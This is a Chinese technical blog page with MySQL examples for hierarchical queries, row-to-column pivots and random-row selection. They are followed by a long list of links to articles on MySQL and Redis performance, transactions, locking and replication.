<h3 id="MySQL-递归查询"><a href="#MySQL-递归查询" class="headerlink" title="MySQL 递归查询"></a>MySQL 递归查询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">create table question_type (</span><br><span class="line">  id       bigint primary key  not <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'问题编号'</span>,</span><br><span class="line">  parentId bigint              not <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'问题父分类编号，根节点为 0'</span>,</span><br><span class="line">  name     varchar(<span class="number">20</span>)         not <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'编号名称'</span>,</span><br><span class="line">  path     varchar(<span class="number">100</span>)        not <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'全路径，每级使用 , 分割'</span></span><br><span class="line">)</span><br><span class="line">  comment <span class="string">'问题编号'</span>;</span><br><span class="line">insert into question_type values (<span class="number">1</span>, <span class="number">0</span>, <span class="string">'数学'</span>, <span class="string">'0,1'</span>);</span><br><span class="line">insert into question_type values (<span class="number">2</span>, <span class="number">1</span>, <span class="string">'高等数学'</span>, <span class="string">'0,1,2'</span>);</span><br><span class="line">insert into question_type values (<span class="number">3</span>, <span class="number">1</span>, <span class="string">'线性代数'</span>, <span class="string">'0,1,3'</span>);</span><br><span class="line">insert into question_type values (<span class="number">4</span>, <span class="number">0</span>, <span class="string">'英语'</span>, <span class="string">'0,4'</span>);</span><br><span class="line">insert into question_type values (<span class="number">5</span>, <span class="number">4</span>, <span class="string">'即时翻译'</span>, <span class="string">'0,4,5'</span>);</span><br><span class="line">insert into question_type values (<span class="number">6</span>, <span class="number">4</span>, <span class="string">'口语阅读'</span>, <span class="string">'0,4,6'</span>);</span><br><span class="line">insert into question_type values (<span class="number">7</span>, <span class="number">0</span>, <span class="string">'物理'</span>, <span class="string">'0,7'</span>);</span><br><span class="line">insert into question_type values (<span class="number">8</span>, <span class="number">7</span>, <span class="string">'高能物理'</span>, <span class="string">'0,7,8'</span>);</span><br><span class="line">insert into question_type values (<span class="number">9</span>, <span class="number">8</span>, <span class="string">'无限能量'</span>, <span class="string">'0,7,8,9'</span>);</span><br><span class="line">insert into question_type values (<span class="number">10</span>, <span class="number">9</span>, <span class="string">'迪克拉之海'</span>, <span class="string">'0,7,8,9,10'</span>);</span><br><span class="line"># 查询物理分类及其子级</span><br><span class="line">select *</span><br><span class="line"><span class="keyword">from</span> question_type</span><br><span class="line">where path regexp concat(</span><br><span class="line">    <span class="string">','</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="string">',|^'</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="string">',|,'</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="string">'$|^'</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="string">'$'</span>);</span><br><span class="line">https:<span class="comment">//blog.rxliuli.com/p/5830226b/</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-行列转换"><a href="#MySQL-行列转换" class="headerlink" title="MySQL 行列转换"></a>MySQL 行列转换</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">drop table <span class="keyword">if</span> exists exam;</span><br><span class="line">create table exam (</span><br><span class="line">  name    varchar(<span class="number">20</span>) not <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'姓名'</span>,</span><br><span class="line">  subject varchar(<span class="number">20</span>) not <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'考试科目'</span>,</span><br><span class="line">  score   int         <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'考试成绩'</span></span><br><span class="line">)</span><br><span class="line">  comment <span class="string">'考试记录'</span>;</span><br><span class="line"></span><br><span class="line">insert into exam values (<span class="string">'琉璃'</span>, <span class="string">'语文'</span>, <span class="number">90</span>);</span><br><span class="line">insert into exam values (<span class="string">'琉璃'</span>, <span class="string">'英语'</span>, <span class="number">85</span>);</span><br><span class="line">insert into exam values (<span class="string">'楚轩'</span>, <span class="string">'数学'</span>, <span class="number">100</span>);</span><br><span class="line">insert into exam values (<span class="string">'楚轩'</span>, <span class="string">'物理'</span>, <span class="number">100</span>);</span><br><span class="line">insert into exam values (<span class="string">'张三'</span>, <span class="string">'化学'</span>, <span class="number">40</span>);</span><br><span class="line">insert into exam values (<span class="string">'李四'</span>, <span class="string">'生物'</span>, <span class="number">100</span>);</span><br><span class="line">select</span><br><span class="line">  name                              <span class="keyword">as</span> <span class="string">'姓名'</span>,</span><br><span class="line">  max(<span class="keyword">if</span>(subject = <span class="string">'语文'</span>, score, <span class="number">0</span>)) <span class="keyword">as</span> <span class="string">'语文'</span>,</span><br><span class="line">  max(<span class="keyword">if</span>(subject = <span class="string">'数学'</span>, score, <span class="number">0</span>)) <span class="keyword">as</span> <span class="string">'数学'</span>,</span><br><span class="line">  max(<span class="keyword">if</span>(subject = <span class="string">'英语'</span>, score, <span class="number">0</span>)) <span class="keyword">as</span> <span class="string">'英语'</span>,</span><br><span class="line">  max(<span class="keyword">if</span>(subject = <span class="string">'物理'</span>, score, <span class="number">0</span>)) <span class="keyword">as</span> <span class="string">'物理'</span>,</span><br><span class="line">  max(<span class="keyword">if</span>(subject = <span class="string">'化学'</span>, score, <span class="number">0</span>)) <span class="keyword">as</span> <span class="string">'化学'</span>,</span><br><span class="line">  max(<span class="keyword">if</span>(subject = <span class="string">'生物'</span>, score, <span class="number">0</span>)) <span class="keyword">as</span> <span class="string">'生物'</span></span><br><span class="line"><span class="keyword">from</span> exam</span><br><span class="line">group by name;</span><br><span class="line">select</span><br><span class="line">  name                                                                  <span class="keyword">as</span> <span class="string">'姓名'</span>,</span><br><span class="line">  sum(<span class="keyword">if</span>(subject = <span class="string">'语文'</span> or subject = <span class="string">'数学'</span> or subject = <span class="string">'英语'</span>, score, <span class="number">0</span>)) <span class="keyword">as</span> <span class="string">'主科'</span>,</span><br><span class="line">  sum(<span class="keyword">if</span>(subject = <span class="string">'物理'</span> or subject = <span class="string">'化学'</span> or subject = <span class="string">'生物'</span>, score, <span class="number">0</span>)) <span class="keyword">as</span> <span class="string">'副科'</span></span><br><span class="line"><span class="keyword">from</span> exam</span><br><span class="line">group by name;</span><br><span class="line">select</span><br><span class="line">  name <span class="keyword">as</span> <span class="string">'姓名'</span>,</span><br><span class="line">  max(<span class="keyword">case</span> subject when <span class="string">'语文'</span> then score <span class="keyword">else</span> <span class="number">0</span> end) <span class="keyword">as</span> <span class="string">'语文'</span>,</span><br><span class="line">  max(<span class="keyword">case</span> subject when <span class="string">'数学'</span> then score <span class="keyword">else</span> <span class="number">0</span> end) <span class="keyword">as</span> <span class="string">'数学'</span>,</span><br><span class="line">  max(<span class="keyword">case</span> subject when <span class="string">'英语'</span> then score <span class="keyword">else</span> <span class="number">0</span> end) <span class="keyword">as</span> <span class="string">'英语'</span>,</span><br><span class="line">  max(<span class="keyword">case</span> subject when <span class="string">'物理'</span> then score <span class="keyword">else</span> <span class="number">0</span> end) <span class="keyword">as</span> <span class="string">'物理'</span>,</span><br><span class="line">  max(<span class="keyword">case</span> subject when <span class="string">'化学'</span> then score <span class="keyword">else</span> <span class="number">0</span> end) <span class="keyword">as</span> <span class="string">'化学'</span>,</span><br><span class="line">  max(<span class="keyword">case</span> subject when <span class="string">'生物'</span> then score <span class="keyword">else</span> <span class="number">0</span> end) <span class="keyword">as</span> <span class="string">'生物'</span></span><br><span class="line"><span class="keyword">from</span> exam</span><br><span class="line">group by name;</span><br><span class="line">https:<span class="comment">//blog.rxliuli.com/p/73dac442/</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-获取随机条数据"><a href="#MySQL-获取随机条数据" class="headerlink" title="MySQL 获取随机条数据"></a>MySQL 获取随机条数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">create table topic (</span><br><span class="line">  id      int primary key not <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'编号'</span>,</span><br><span class="line">  content varchar(<span class="number">20</span>)     not <span class="literal">null</span></span><br><span class="line">  comment <span class="string">'内容'</span></span><br><span class="line">)</span><br><span class="line">  comment <span class="string">'主题表'</span>;</span><br><span class="line">select *</span><br><span class="line"><span class="keyword">from</span> topic</span><br><span class="line">order by rand()</span><br><span class="line">limit <span class="number">50000</span>;</span><br><span class="line">select *</span><br><span class="line"><span class="keyword">from</span> (</span><br><span class="line">       select</span><br><span class="line">         topic.*,</span><br><span class="line">         rand() <span class="keyword">as</span> order_column</span><br><span class="line">       <span class="keyword">from</span> topic</span><br><span class="line">     ) <span class="keyword">as</span> temp</span><br><span class="line">order by order_column</span><br><span class="line">limit <span class="number">50000</span>;</span><br><span class="line"></span><br><span class="line">select *</span><br><span class="line"><span class="keyword">from</span> topic</span><br><span class="line">where id &gt;= ((select max(id)</span><br><span class="line">              <span class="keyword">from</span> topic)</span><br><span class="line">             - (select min(id)</span><br><span class="line">                <span class="keyword">from</span> topic))</span><br><span class="line">            * rand()</span><br><span class="line">            + (select min(id)</span><br><span class="line">               <span class="keyword">from</span> topic)</span><br><span class="line">limit <span class="number">50000</span>;</span><br><span class="line">SELECT t.*</span><br><span class="line">FROM topic t</span><br><span class="line">  JOIN</span><br><span class="line">  (SELECT id</span><br><span class="line">   FROM <span class="string">`topic`</span></span><br><span class="line">   ORDER BY RAND()</span><br><span class="line">   LIMIT <span class="number">50000</span>) AS z ON z.id = t.id;</span><br><span class="line">https:<span class="comment">//blog.rxliuli.com/p/931be19d/</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.debuginn.cn/4951.html" target="_blank" rel="noopener">Redis 知识点汇总</a></p>
<p><a href="https://learnku.com/articles/38615" target="_blank" rel="noopener">一张图搞定七种 JOIN 关系</a></p>
<p><a href="https://ops-coffee.cn/s/p5UKuh1yY3P4zrOzVBmY1w" target="_blank" rel="noopener">MySQL EXPLAIN结果集分析</a></p>
<p><a href="https://anemone.top/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">SQL注入总结</a></p>
<p><a href="https://bettercuicui.github.io/2018/04/01/MYSQL/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B0%B4%E5%B9%B3%E5%88%87%E5%88%86%E4%BA%8C%E4%B8%89%E4%BA%8B/" target="_blank" rel="noopener"> 数据库水平切分二三事</a></p>
<p><a href="https://bettercuicui.github.io/public/image/mysql/%E7%AC%AC6%E7%AB%A0%20%E9%94%81.png" target="_blank" rel="noopener">mysql锁</a></p>
<p><a href="https://bettercuicui.github.io/2018/04/01/MYSQL/InnoDB%E9%94%81/" target="_blank" rel="noopener">InnoDB锁</a></p>
<p><a href="https://learnku.com/articles/37013" target="_blank" rel="noopener">MySQL 优化笔记</a></p>
<p><a href="https://learnku.com/articles/35589" target="_blank" rel="noopener">手把手带你探索 MySQL 事务的隔离</a></p>
<p><a href="https://www.qqdeveloper.com/2019/08/18/MySQl%E4%BA%8B%E5%8A%A1%E6%9C%80%E5%85%A8%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">MySQl事务最全详解</a></p>
<p><a href="https://blog.ouyangsihai.cn/mysql-de-you-yi-shen-qi-suo.html" target="_blank" rel="noopener">MySQL的又一神器-锁，MySQL面试必备</a></p>
<p><a href="https://learnku.com/articles/37013" target="_blank" rel="noopener">MySQL 优化笔记</a></p>
<p><a href="https://learnku.com/articles/37040" target="_blank" rel="noopener">一条 SQL 查询语句是如何执行的</a></p>
<p><a href="https://learnku.com/articles/36523" target="_blank" rel="noopener">MySQL 表结构生成 Markdown 文档</a></p>
<p><a href="https://learnku.com/mysql/wikis/36434" target="_blank" rel="noopener">mysql wiki</a></p>
<p><a href="https://learnku.com/articles/35660" target="_blank" rel="noopener">MySQL 三大范式</a></p>
<p><a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088" target="_blank" rel="noopener">在线sql</a></p>
<p><a href="https://learnku.com/articles/35576" target="_blank" rel="noopener">事务知识点总结</a></p>
<p><a href="https://gleehub.com/program/mysql-xue-xi-bi-ji.html" target="_blank" rel="noopener">MySQL 学习笔记</a></p>
<p><a href="http://jeff-tan.github.io/2017/10/02/%E6%82%B2%E8%A7%82%E9%94%81%20&amp;%20%E4%B9%90%E8%A7%82%E9%94%81/" target="_blank" rel="noopener">悲观锁 &amp; 乐观锁</a></p>
<p>SQL注入总结<a href="https://anemone.top/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://anemone.top/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI4NzE2MDI5NA==&amp;mid=2650280758&amp;idx=1&amp;sn=45f0c238ee6a96ca62030e095ee5a676&amp;chksm=f3dd51bfc4aad8a9cc1d6e8aca838bb742b6c9b7f2b4934bc8a1eeac0097f23aca63aaa752f4&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1569765640739&amp;sharer_shareid=c981482699a0ec1b5f7736eac15aa25b&amp;key=20f7b87cb3d4d9a8da53f19bdd8f499d09bec0eec75803772a28388c07935ed05887351ee092ae7a2c40e6bf402ea0e6a4a7ae2c1653d765c07a65ebc1840fac7836282b04b6d6c05f46b87114387106&amp;ascene=1&amp;uin=NjQ3OTQwMTAy&amp;devicetype=Windows+7&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=YLoS2PNn8p2iY1DXdpvym0%2Fkx1J0GU6uiBZYmtIEnqkwLW%2FGgzQoq5f%2BqsMWHZPw" target="_blank" rel="noopener">MySQL事务最全详解</a> </p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247484920&amp;idx=1&amp;sn=72a78473bcf1105fa107ebe2a71e0855&amp;chksm=fc974ce9cbe0c5fffb63e6e0186dba2d8dbf4113e677f23da2a10f401da8ffb1b4ad308090d8&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1569734986919&amp;sharer_shareid=08dc8069c5231ca71a4c24702a482f37&amp;key=f8a21a8df9909cbbff14737567cfc7b5d7782dd5b837184b9322d11bd7915c579145bd4a27a5754c159f1022864d797492413f831d496402eb8eb247fa61dd367e1db198eec652623322529d774ee999&amp;ascene=1&amp;uin=NjQ3OTQwMTAy&amp;devicetype=Windows+7&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=YLoS2PNn8p2iY1DXdpvym0%2Fkx1J0GU6uiBZYmtIEnqkwLW%2FGgzQoq5f%2BqsMWHZPw" target="_blank" rel="noopener">SQL注入的几种类型和原理</a> </p>
<p>信息收集思路整理<a href="https://anemone.top/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">https://anemone.top/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/</a></p>
<p><a href="https://learnku.com/articles/31832" target="_blank" rel="noopener">搭建 MySQL 主从服务器</a></p>
<p><a href="http://yyeer.com/%E6%95%B0%E6%8D%AE%E5%BA%93/2018/12/22/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8de%E9%82%A3%E4%BA%9B%E4%BA%8B-%E7%90%86%E8%AE%BA%E7%AF%87/" target="_blank" rel="noopener">分库分表de那些事【理论篇】</a></p>
<p><a href="https://learnku.com/articles/34878" target="_blank" rel="noopener">一次慢查询优化过程</a></p>
<p><a href="https://laucyun.com/a8b422bc6a7712a001117708fc2578b3.html" target="_blank" rel="noopener">Navicat Premium 12 for Mac无补丁无毒的激活方法</a></p>
<p><a href="http://www.querymongo.com/" target="_blank" rel="noopener">一个 sql 转 mongo query 的小工具,  https://github.com/guxingke/sql2mongo </a></p>
<p><a href="https://blog.fazero.me/2017/09/15/mysql-master-slave/" target="_blank" rel="noopener">Mysql数据库设置主从同步</a></p>
<p><a href="https://learnku.com/articles/33749" target="_blank" rel="noopener">MySQL 事务最全详解</a></p>
<p><a href="https://learnku.com/articles/28609" target="_blank" rel="noopener">MySQL 索引 +explain</a></p>
<p><a href="https://learnku.com/articles/33779" target="_blank" rel="noopener">MySQL 运行原理【事务】</a></p>
<p><a href="https://learnku.com/articles/33780" target="_blank" rel="noopener">MySQL 运行原理【表】</a></p>
<p><a href="https://learnku.com/articles/25148" target="_blank" rel="noopener">MySQL 社区规范 | 数据库篇</a></p>
<p><a href="https://alpha2016.github.io/2019/04/15/MySQL%E5%8F%8D%E5%BA%94%E6%85%A2%E7%9A%84%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/" target="_blank" rel="noopener">MySQL反应慢的排查思路</a></p>
<p><a href="http://imysql.com/my-cnf-wizard.html" target="_blank" rel="noopener">my.cnf生成工具</a></p>
<p><a href="https://juejin.im/post/5d42f48cf265da03ab422e08" target="_blank" rel="noopener">后端程序员必备：mysql数据库相关流程图/原理图</a></p>
<p><a href="https://mengkang.net/1328.html" target="_blank" rel="noopener">Mysql 使用 optimizer_trace 查看执行流程，分析、验证优化思路</a></p>
<p><a href="https://mengkang.net/1355.html" target="_blank" rel="noopener">一次 group by + order by 性能优化分析</a></p>
<p><a href="https://learnku.com/articles/30486" target="_blank" rel="noopener">sql_mode=only_full_group_by 错误</a></p>
<p> <a href="https://www.cnblogs.com/glon/p/6761028.html" target="_blank" rel="noopener">ClickHouse 快速入门</a></p>
<p><a href="http://mywebsql.net/" target="_blank" rel="noopener">在线执行sql </a></p>
<p><a href="https://github.com/danfengcao/binlog2sql" target="_blank" rel="noopener">MySQL数据恢复工具binlog2sql</a></p>
<p><a href="https://www.restran.net/2018/10/29/ctf-sqli-notes/" target="_blank" rel="noopener">CTF 中的 SQL 注入总结</a></p>
<p><a href="https://blog.smoker.cc/mysql/common-skills.html" target="_blank" rel="noopener">MySQL 常用技巧</a></p>
<p><a href="https://segmentfault.com/p/1210000008951080/read" target="_blank" rel="noopener">mysql 证明为什么用limit时，offset很大会影响性能</a></p>
<p><a href="https://learnku.com/articles/26067" target="_blank" rel="noopener">MySQL 细致总结之基础篇</a></p>
<p><a href="https://www.v2ex.com/t/472180" target="_blank" rel="noopener">mysql connection time out</a></p>
<p><a href="https://blog.xupeng.me/2013/10/11/mysql-replace-into-trap/" target="_blank" rel="noopener">mysql replace into 坑</a></p>
<p><a href="https://mp.weixin.qq.com/s/CMYHiW3hgDCBYH5P1XcmaQ" target="_blank" rel="noopener">Redis学习</a></p>
<p><a href="https://blog.yiranzai.cn/posts/990/" target="_blank" rel="noopener">MyCAT实现MySQL读写分离</a></p>
<p><a href="https://github.com/xaecbd/RCT" target="_blank" rel="noopener">Redis 内存分析工具</a></p>
<p><a href="http://eienao.com/posts/mysql-innodb-row-level-locking-mechanism.html" target="_blank" rel="noopener">mysql —— InnoDB行级锁机制</a></p>
<p><a href="https://learnku.com/articles/25148#topnav" target="_blank" rel="noopener">MySQL 社区规范 | 数据库篇</a></p>
<p><a href="https://learnku.com/articles/25116#topnav" target="_blank" rel="noopener">MySQL 规范 (数据库表设计规范)</a></p>
<p><a href="https://learnku.com/articles/25020#topnav" target="_blank" rel="noopener">MySQL 规范</a></p>
<p><a href="http://fanqieto.top/2017/11/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84%E4%BC%98%E5%8C%96/" target="_blank" rel="noopener">mysql数据库结构优化</a></p>
<p><a href="https://mp.weixin.qq.com/s/OzAnRVPUDtoiIXqeC7YL6g" target="_blank" rel="noopener">阿里云Redis开发规范</a></p>
<p><a href="https://mp.weixin.qq.com/s/F0PrHNqfD-JVn8if3q8S0Q" target="_blank" rel="noopener">MySQL索引优化实战</a></p>
<p><a href="https://mp.weixin.qq.com/s/EC5cgQ1ne9ZR0jFvznHBfg" target="_blank" rel="noopener">一个字节的网络漫游故事独白</a></p>
<p><a href="https://mp.weixin.qq.com/mp/homepage?__biz=MzI0MDQ4MTM5NQ==&amp;hid=8&amp;sn=1db566bed001a8db6d9927540ccc2156&amp;scene=1&amp;devicetype=iOS12.1.2&amp;version=17000326&amp;lang=zh_CN&amp;nettype=WIFI&amp;ascene=7&amp;session_us=gh_53f281f2ae80&amp;fontScale=100&amp;wx_header=1" target="_blank" rel="noopener">技术精选</a></p>
<p><a href="https://mp.weixin.qq.com/s/FIMDOksAej5uqxT1YksyxA" target="_blank" rel="noopener">Redis过期策略及实现原理</a></p>
<p><a href="https://mp.weixin.qq.com/s/Z3Juad9pz33EWiKAH7ZgzA" target="_blank" rel="noopener">19条MySQL优化</a></p>
<p><a href="https://www.cnblogs.com/junwangzhe/p/6420049.html" target="_blank" rel="noopener">Mysql分表和分区的区别、分库分表介绍与区别</a></p>
<p><a href="https://www.cnblogs.com/it-cen/p/4984272.html" target="_blank" rel="noopener">用Redis实现分布式锁 与 实现任务队列</a></p>
<p><a href="https://segmentfault.com/a/1190000016902003" target="_blank" rel="noopener">面试官问你如何解决web高并发这样回答就好了</a></p>
<p><a href="https://www.cnblogs.com/it-cen/p/4984272.html" target="_blank" rel="noopener">Redis实现分布式锁与任务队列的思路与源码 </a></p>
<p><a href="https://www.cnblogs.com/-mrl/p/9519259.html" target="_blank" rel="noopener">PHP+Redis，实现延迟任务 实现自动取消订单，自动完成订</a></p>
<p><a href="https://www.v2ex.com/t/536138#reply149" target="_blank" rel="noopener">MySQL 图形化工具 </a></p>
<p><a href="https://mp.weixin.qq.com/s/PbtikNJlGmsR2iLSIA4aMw" target="_blank" rel="noopener">MYSQL的SQL性能优化总结</a></p>
<p><a href="https://www.einsition.com/article/14/details" target="_blank" rel="noopener">MySQL 主从复制 实例讲解</a></p>
<p><a href="https://juejin.im/post/5a912b3f5188257a5c608729" target="_blank" rel="noopener">Redis从入门到实践</a></p>
<p><a href="https://github.com/jaywcjlove/handbook/tree/master/Redis" target="_blank" rel="noopener">10分钟快速入门Redis</a></p>
<p><a href="http://cenalulu.github.io/mysql/mysql-tools-list/" target="_blank" rel="noopener">MySQL工具汇总</a></p>
<p><a href="http://www.54php.cn/default/240.html" target="_blank" rel="noopener">MySQL 大表优化方案</a></p>
<p><a href="http://www.syyong.com/db/Mysql-lock.html" target="_blank" rel="noopener">Mysql 锁</a></p>
<p><a href="https://www.0php.net/posts/%E5%A4%87%E5%BF%98-PHP-PDO-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html" target="_blank" rel="noopener">pdo bindParam bindValue</a></p>
<p><a href="https://www.0php.net/posts/MySQL-%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E5%AE%9E%E9%AA%8C-%E8%AE%A4%E8%AF%86%EF%BC%9A%E8%84%8F%E8%AF%BB%E3%80%81%E4%B8%8D%E5%8F%AF%E9%87%8D%E5%A4%8D%E8%AF%BB%E3%80%81%E5%B9%BB%E8%AF%BB.html" target="_blank" rel="noopener">MYSQL 事务隔离实验-认识：脏读、不可重复读、幻读</a></p>
<p><a href="http://seanlook.com/2018/03/21/mysql-pagination-no-offset/" target="_blank" rel="noopener">MySQL分页优化</a></p>
<p><a href="https://www.awaimai.com/1910.html" target="_blank" rel="noopener">msyql日志</a></p>
<p><a href="http://mysql.taobao.org/monthly/2017/11/09/" target="_blank" rel="noopener">MySQL · 最佳实践 · 分区表基本类型</a></p>
<p><a href="https://laravel-china.org/topics/17508" target="_blank" rel="noopener">花式搭建 Laravel 运行环境</a></p>
<p><a href="http://www.helpergarden.com/2018/05/mysql%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae%e5%ad%98%e5%82%a8%e9%80%89%e6%8b%a9.html" target="_blank" rel="noopener">mysql中的数据存储选择</a></p>
<p><a href="https://www.fanhaobai.com/2016/05/lnmp.html" target="_blank" rel="noopener">安装LNMP开发环境</a></p>
<p><a href="http://www.helpergarden.com/2014/03/mysql-masterslave-%e5%ae%9e%e6%88%98.html" target="_blank" rel="noopener">Mysql Master&amp;Slave 实战</a></p>
<p><a href="https://www.raymondwu.net/2018/07/26/Laravel%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%E4%B8%8EMySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/" target="_blank" rel="noopener">MySQL 主从复制部署与 Laravel 读写分离配置</a></p>
<p><a href="https://laravel-china.org/articles/22190" target="_blank" rel="noopener">教你 MySQL Binlog 实用攻略</a></p>
<p><a href="https://www.goozp.com/article/22.html" target="_blank" rel="noopener">《高性能MySQL》学习笔记1——MySQL架构</a></p>
<p><a href="https://laravel-china.org/articles/22188" target="_blank" rel="noopener">MySQL 部分整理</a></p>
<p><a href="https://www.goozp.com/article/30.html" target="_blank" rel="noopener">PHP开发之网站安全</a></p>
<p><a href="https://www.woann.cn/article/10" target="_blank" rel="noopener">mysql的水平分库分表和垂直分库分表</a></p>
<p><a href="https://laravel-china.org/articles/19472#b808e0" target="_blank" rel="noopener">MySQL 索引初探</a></p>
<p><a href="https://blog.csdn.net/iechenyb/article/details/79828413" target="_blank" rel="noopener">redis主从库读写分离</a></p>
<p><a href="https://laravel-china.org/articles/13849/understanding-four-isolation-levels-in-mysql" target="_blank" rel="noopener">MySQL 中的四种隔离级别</a></p>
<p><a href="https://www.raymondwu.net/2018/07/26/Laravel%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%E4%B8%8EMySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/" target="_blank" rel="noopener">MySQL 主从复制部署与 Laravel 读写分离配置</a></p>
<p><a href="http://youngyu.net/post/bslaravel4" target="_blank" rel="noopener">部署Laravel实战：Step 4 MySQL主从复制</a></p>
<p><a href="https://laravel-china.org/articles/22363" target="_blank" rel="noopener">Redis 面试内容</a></p>
<p><a href="https://github.com/Qihoo360/pika/blob/master/README_CN.md" target="_blank" rel="noopener">Pika是一个可持久化的大容量redis存储服务</a></p>
<p><a href="https://laravel-china.org/articles/10735/yum-quickly-build-lnmp-development-environment" target="_blank" rel="noopener">yum 快速搭建 lnmp 开发环境</a></p>
<p><a href="https://segmentfault.com/a/1190000012164089" target="_blank" rel="noopener">redis笔记</a></p>
<p><a href="https://learnku.com/articles/22363#413d78" target="_blank" rel="noopener">面试前必须要知道的 Redis 面试内容</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/36337666" target="_blank" rel="noopener">elastic stack来分析下你的redis slowlog</a></p>
<p><a href="http://www.thpffcj.com/2017/12/20/Redis-Getting-Started-2/" target="_blank" rel="noopener">Redis 入门</a></p>
<p><a href="https://www.liaoxuefeng.com/wiki/1177760294764384" target="_blank" rel="noopener">在线sqlhttp://mywebsql.net/</a></p>
<p><a href="https://learnku.com/articles/25739" target="_blank" rel="noopener">MySQL 详细学习笔记</a></p>
<p><a href="https://learnku.com/php/t/33573" target="_blank" rel="noopener">SQL 最近位置查询语句</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
